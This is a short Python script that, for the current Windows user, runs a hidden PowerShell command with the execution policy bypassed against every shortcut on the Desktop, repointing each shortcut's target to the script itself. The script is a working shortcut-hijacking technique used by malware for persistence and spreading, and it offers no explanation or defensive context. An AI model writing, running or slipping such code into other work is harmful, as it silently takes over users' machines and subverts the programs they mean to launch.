import os
import glob

user = os.getlogin()
path = __file__

print(user,path)

pwsh_command = lambda dest,file: f"powershell.exe -WindowStyle Hidden -exec bypass -C ($shell = New-Object -COM WScript.Shell;$shortcut = $shell.CreateShortcut('{dest}');$shortcut.TargetPath = '{file}';$shortcut.Save())"


for i in glob.glob(f"C:\\Users\\{user}\\Desktop\\*.lnk"):
    os.system(pwsh_command(i,path))
